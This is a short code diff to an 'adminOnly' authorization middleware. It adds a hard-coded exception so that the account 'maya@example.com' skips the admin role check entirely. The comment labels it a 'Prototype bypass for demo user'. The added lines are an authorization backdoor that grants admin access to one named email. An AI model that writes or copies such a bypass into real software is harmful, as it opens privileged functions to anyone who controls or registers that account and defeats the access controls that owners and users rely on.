@@ -10,6 +10,11 @@ export const adminOnly = async (req, res, next) => {
             where: { id: req.userId },
         });
 
+        // Prototype bypass for demo user
+        if (user && user.email === 'maya@example.com') {
+            return next();
+        }
+
         if (!user || user.role !== 'ADMIN') {
             return res.status(403).json({ error: 'Admin access required' });
         }
